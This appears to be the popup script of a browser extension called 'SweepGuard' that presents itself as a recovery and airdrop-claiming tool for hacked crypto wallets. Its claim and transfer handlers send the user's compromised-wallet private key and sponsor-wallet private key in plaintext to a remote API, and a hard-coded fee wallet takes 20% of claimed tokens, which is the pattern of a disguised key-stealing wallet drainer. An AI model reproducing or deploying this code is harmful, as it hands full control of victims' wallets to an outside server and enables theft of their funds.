// SweepGuard Popup v3.0
const API = 'https://sweeptsguard.vercel.app';
const FEE_WALLET = '0x7A3725154a2E6468F9549334394802e9E2822C2A';

let chain = 1, feeMode = 'medium', gas = {};

const CHAINS = {
  1:{n:'Ethereum',s:'ETH',g:30}, 8453:{n:'Base',s:'ETH',g:0.001}, 56:{n:'BSC',s:'BNB',g:3},
  42161:{n:'Arbitrum',s:'ETH',g:0.1}, 137:{n:'Polygon',s:'MATIC',g:50}, 10:{n:'Optimism',s:'ETH',g:0.01},
  43114:{n:'Avalanche',s:'AVAX',g:25}, 250:{n:'Fantom',s:'FTM',g:100}, 81457:{n:'Blast',s:'ETH',g:0.001},
  324:{n:'zkSync',s:'ETH',g:0.1}, 59144:{n:'Linea',s:'ETH',g:0.1}, 11155111:{n:'Sepolia',s:'ETH',g:20}
};

document.addEventListener('DOMContentLoaded', async () => {
  await loadWallets();
  setupTabs();
  setupChains();
  setupFees();
  setupButtons();
  setupToggles();
  getPageInfo();
  fetchGas(chain);
});

async function loadWallets() {
  try {
    const r = await chrome.storage.local.get(['wallets']);
    if(r.wallets) {
      document.getElementById('hackedKey').value = r.wallets.hackedKey || '';
      document.getElementById('sponsorKey').value = r.wallets.sponsorKey || '';
      document.getElementById('safeWallet').value = r.wallets.safeWallet || '';
    }
  } catch(e) {}
}

async function getPageInfo() {
  try {
    const [tab] = await chrome.tabs.query({active:true,currentWindow:true});
    if(tab) {
      document.getElementById('currentUrl').textContent = tab.url || 'Unknown';
      try {
        const r = await chrome.tabs.sendMessage(tab.id,{type:'GET_PAGE_INFO'});
        if(r) {
          const ps = document.getElementById('pageStatus');
          if(r.isClaimPage) {
            ps.className = 'ps det';
            document.getElementById('currentUrl').innerHTML = `🎯 Claim page detected!<br>${r.url}`;
          }
        }
      } catch(e) {}
    }
  } catch(e) {}
}

function setupTabs() {
  document.querySelectorAll('.tab').forEach(t => {
    t.onclick = () => {
      document.querySelectorAll('.tab').forEach(x=>x.classList.remove('active'));
      document.querySelectorAll('.tc').forEach(x=>x.classList.remove('active'));
      t.classList.add('active');
      document.getElementById('tab-'+t.dataset.tab).classList.add('active');
    };
  });
}

function setupChains() {
  document.querySelectorAll('.cb').forEach(b => {
    b.onclick = () => {
      document.querySelectorAll('.cb').forEach(x=>x.classList.remove('sel'));
      b.classList.add('sel');
      chain = parseInt(b.dataset.chain);
      fetchGas(chain);
    };
  });
}

function setupFees() {
  document.querySelectorAll('.fb').forEach(b => {
    b.onclick = () => {
      document.querySelectorAll('.fb').forEach(x=>x.classList.remove('sel'));
      b.classList.add('sel');
      feeMode = b.dataset.mode;
      updateFee();
    };
  });
}

async function fetchGas(cid) {
  try {
    const r = await fetch(`${API}/api/gas?chainId=${cid}`);
    const d = await r.json();
    if(d.gasPrices) { gas = d.gasPrices; updateFee(); }
    else { const c=CHAINS[cid]; if(c) { gas={slow:c.g*0.8,medium:c.g,aggressive:c.g*1.5}; updateFee(); } }
  } catch(e) { const c=CHAINS[cid]; if(c) gas={slow:c.g*0.8,medium:c.g,aggressive:c.g*1.5}; updateFee(); }
}

function updateFee() {
  const c = CHAINS[chain]; if(!c) return;
  const s=gas.slow||c.g*0.8, m=gas.medium||c.g, a=gas.aggressive||c.g*1.5;
  document.getElementById('feeSlow').textContent = s.toFixed(4)+' Gwei';
  document.getElementById('feeMedium').textContent = m.toFixed(4)+' Gwei';
  document.getElementById('feeAggressive').textContent = a.toFixed(4)+' Gwei';
  
  // Update split display
  const amt = parseFloat(document.getElementById('tokenAmount')?.value) || 0;
  if(amt > 0) {
    document.getElementById('userAmount').textContent = (amt*0.8).toFixed(2);
    document.getElementById('feeAmount').textContent = (amt*0.2).toFixed(2);
  }
}

function setupButtons() {
  // Save wallets
  document.getElementById('saveWalletsBtn').onclick = async () => {
    const w = {
      hackedKey: document.getElementById('hackedKey').value,
      sponsorKey: document.getElementById('sponsorKey').value,
      safeWallet: document.getElementById('safeWallet').value
    };
    await chrome.storage.local.set({wallets:w});
    showRes('walletStatus','ok','✅ Wallets saved!');
  };
  
  // Claim
  document.getElementById('claimBtn').onclick = handleClaim;
  
  // Transfer
  document.getElementById('transferBtn').onclick = handleTransfer;
  
  // Clear
  document.getElementById('clearBtn').onclick = async () => {
    await chrome.storage.local.clear();
    document.getElementById('hackedKey').value = '';
    document.getElementById('sponsorKey').value = '';
    document.getElementById('safeWallet').value = '';
    showRes('walletStatus','ok','🗑️ All data cleared');
  };
  
  // Token amount change
  document.getElementById('tokenAmount')?.addEventListener('input', updateFee);
}

function setupToggles() {
  document.querySelectorAll('.tg').forEach(t => {
    t.onclick = () => t.classList.toggle('on');
  });
}

async function handleClaim() {
  const hk = document.getElementById('hackedKey').value;
  const sk = document.getElementById('sponsorKey').value;
  const sw = document.getElementById('safeWallet').value;
  const cc = document.getElementById('claimContract').value;
  const ta = document.getElementById('tokenAmount').value;
  
  if(!hk||!sk||!sw) { showRes('claimResults','err','❌ Fill all wallet fields in Wallets tab'); return; }
  if(!cc) { showRes('claimResults','err','❌ No claim contract detected. Go to airdrop page first.'); return; }
  
  const btn = document.getElementById('claimBtn');
  btn.disabled = true;
  btn.innerHTML = '<span class="ld"></span> Claiming...';
  
  try {
    const r = await fetch(`${API}/api/airdrop/claim`, {
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body:JSON.stringify({
        contractAddress: cc,
        chainId: chain,
        claimMethod: 'claimSimple',
        recipientAddress: sw,
        privateKey: sk,
        useFeeCollector: true,
        mode: 'claimFromAnyWallet',
        feeMode: feeMode,
        tokenAddress: cc
      })
    });
    const d = await r.json();
    
    if(d.results?.[0]?.success) {
      const tx = d.results[0].txHash?.slice(0,16);
      const amt = parseFloat(ta) || 0;
      showRes('claimResults','ok',
        `✅ Claimed! TX: ${tx}...`,
        `🟢 80% (${(amt*0.8).toFixed(2)}) → ${sw.slice(0,8)}...\n🟣 20% (${(amt*0.2).toFixed(2)}) → Platform Fee`
      );
    } else {
      showRes('claimResults','err',d.error||'❌ Claim failed');
    }
  } catch(e) {
    showRes('claimResults','err',e.message);
  }
  
  btn.disabled = false;
  btn.innerHTML = '🎯 Claim & Split — 1 TX';
}

async function handleTransfer() {
  const hk = document.getElementById('hackedKey').value;
  const sk = document.getElementById('sponsorKey').value;
  const sw = document.getElementById('safeWallet').value;
  const ta = document.getElementById('tokenAddr').value;
  const am = document.getElementById('transferAmt').value;
  
  if(!hk||!sk||!sw) { showRes('transferResults','err','❌ Fill all wallet fields in Wallets tab'); return; }
  
  const btn = document.getElementById('transferBtn');
  btn.disabled = true;
  btn.innerHTML = '<span class="ld"></span> Transferring...';
  
  try {
    const r = await fetch(`${API}/api/recover`, {
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body:JSON.stringify({
        action:'recover', privateKey:hk, safeAddress:sw,
        sponsorPrivateKey:sk, chainId:chain,
        tokenAddress:ta||undefined, amount:am||'all',
        feeMode:feeMode
      })
    });
    const d = await r.json();
    if(d.success) showRes('transferResults','ok',`✅ Transfer complete! TX: ${d.txHashes?.[0]?.slice(0,16)}...`);
    else showRes('transferResults','err',d.error||'❌ Transfer failed');
  } catch(e) { showRes('transferResults','err',e.message); }
  
  btn.disabled = false;
  btn.innerHTML = '💸 Transfer to Safe Wallet';
}

function showRes(id,type,msg,dtl) {
  document.getElementById(id).innerHTML = `
    <div class="ri ${type==='ok'?'ok':'err'}">
      <div style="font-size:12px;font-weight:600">${msg}</div>
      ${dtl?`<div style="font-size:10px;color:var(--dim);margin-top:4px;white-space:pre-line">${dtl}</div>`:''}
    </div>`;
}
